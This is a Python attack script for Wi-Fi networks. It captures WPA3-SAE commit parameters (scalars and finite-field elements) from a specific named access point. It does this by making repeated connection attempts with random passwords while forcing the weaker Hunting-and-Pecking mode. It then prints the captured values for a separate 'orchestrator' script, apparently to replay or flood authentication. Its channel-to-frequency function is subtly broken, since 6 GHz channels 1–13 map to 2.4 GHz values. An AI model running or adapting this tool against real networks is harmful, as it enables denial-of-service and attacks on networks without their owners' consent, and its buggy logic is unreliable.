#!/usr/bin/env python3
"""
================================================================================
WPA3-SAE Parameter Extractor (6 GHz / Wi-Fi 6E Support)
================================================================================
Automates the extraction of 20 valid Scalar & Finite Field pairs.
Supports 2.4 GHz, 5 GHz, and 6 GHz bands.
"""

import os
import sys
import time
import string
import random
import subprocess
from scapy.all import AsyncSniffer, Dot11Auth, sniff

# ==============================================================================
# CONFIGURATION
# ==============================================================================
MANAGED_IFACE  = "wlan1"       # Your client interface (must support 6E for 6GHz)
MONITOR_IFACE  = "wlan0mon"    # Your monitor interface

TARGET_SSID    = "Vodafone_6G"
TARGET_BSSID   = "11:aa:3c:3d:e0:f4".lower()
TARGET_CHANNEL = "1"           # 6GHz Example: Channel 1
NUM_PAIRS      = 20            
# ==============================================================================

scalars = []
finites = []

def get_freq(channel):
    """Calculates frequency based on channel number for 2.4, 5, and 6 GHz."""
    ch = int(channel)
    # 2.4 GHz
    if 1 <= ch <= 13:
        return 2407 + (ch * 5)
    if ch == 14:
        return 2484
    # 5 GHz
    if 32 <= ch <= 177:
        return 5000 + (ch * 5)
    # 6 GHz (Wi-Fi 6E) - Formula: 5945 + (ch * 5)
    if 1 <= ch <= 233 and ch != 14: # High channels overlapping check
        # Simplified: If user targets 6GHz, standard channels usually 1, 5, 9...
        # We assume 6GHz logic here for these channel ranges
        return 5945 + (ch * 5)
    return 2412 # Fallback

def get_packet_handler(current_password):
    def handler(pkt):
        global scalars, finites
        if pkt.haslayer(Dot11Auth) and pkt.type == 0 and pkt.subtype == 11:
            if pkt.addr1 and pkt.addr1.lower() == TARGET_BSSID:
                print(f"    [Debug] Auth-Frame seen! Algo: {pkt[Dot11Auth].algo}, Seq: {pkt[Dot11Auth].seqnum}")
                if pkt[Dot11Auth].algo == 3 and pkt[Dot11Auth].seqnum == 1:
                    payload = bytes(pkt[Dot11Auth].payload)
                    if len(payload) >= 98:
                        group_id = payload[0:2]
                        if group_id == b'\x13\x00':  # Group 19 (ECC)
                            scalar = payload[2:34].hex()
                            finite = payload[34:98].hex()
                            if scalar not in scalars:
                                scalars.append(scalar)
                                finites.append(finite)
                                print(f"[+] Pair {len(scalars)}/{NUM_PAIRS} extracted!")
                                return True 
        return False
    return handler

def main():
    if os.geteuid() != 0:
        sys.exit("[!] Error: This script must be run as root.")

    print(f"[*] Starting WPA3-SAE Parameter Extraction")
    print(f"[*] Target Network: {TARGET_SSID} ({TARGET_BSSID}) on Channel {TARGET_CHANNEL}")
    
    hidden_input = input("[?] Is the target network hidden? (y/n): ").strip().lower()
    
    freq = get_freq(TARGET_CHANNEL)
    
    # Set channel using 'iw' for better 6GHz compatibility
    print(f"[*] Setting {MONITOR_IFACE} to frequency {freq} MHz (Channel {TARGET_CHANNEL})")
    os.system(f"iw dev {MONITOR_IFACE} set freq {freq}")
    
    os.system("killall wpa_supplicant 2>/dev/null")
    time.sleep(1)
    
    while len(scalars) < NUM_PAIRS:
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        hidden_config = "scan_ssid=1" if hidden_input == 'y' else ""
        
        # 6GHz Note: SAE is mandatory. 
        # sae_pwe=0 forces Hunting and Pecking to get Scalars/Finites (H2E would not show them this way)
        conf_content = f"""
network={{
    ssid="{TARGET_SSID}"
    {hidden_config}
    bssid={TARGET_BSSID}
    key_mgmt=SAE
    sae_password="{password}"
    ieee80211w=2
    sae_pwe=0
    freq_list={freq}
}}"""
        with open("/tmp/temp_sae_extractor.conf", "w") as f:
            f.write(conf_content)
        
        print(f"[*] Connection attempt {len(scalars)+1}/{NUM_PAIRS} with Password: {password}")
        
        # AsyncSniffer fix applied here
        sniffer = AsyncSniffer(iface=MONITOR_IFACE, stop_filter=get_packet_handler(password), timeout=8)
        sniffer.start()
        
        time.sleep(0.5)
        
        wpa_cmd = ["wpa_supplicant", "-i", MANAGED_IFACE, "-c", "/tmp/temp_sae_extractor.conf", "-D", "nl80211"]
        wpa_proc = subprocess.Popen(wpa_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        sniffer.join()
        
        wpa_proc.terminate()
        wpa_proc.wait(timeout=2)
        os.system("killall wpa_supplicant 2>/dev/null")
        time.sleep(0.5)

    print("\n" + "="*80)
    print("EXTRACTION COMPLETE! Copy these into your 6GHz Orchestrator Skript:")
    print("="*80 + "\n")
    
    print(f"# Parameters for 6 GHz Network (Channel {TARGET_CHANNEL})")
    print("SAE_SCALAR_6_HEX_LIST = [")
    for s in scalars: print(f"    '{s}',")
    print("]\n")
    
    print("SAE_FINITE_6_HEX_LIST = [")
    for f in finites: print(f"    '{f}',")
    print("]\n")
    
    if os.path.exists("/tmp/temp_sae_extractor.conf"):
        os.remove("/tmp/temp_sae_extractor.conf")

if __name__ == "__main__":
    main()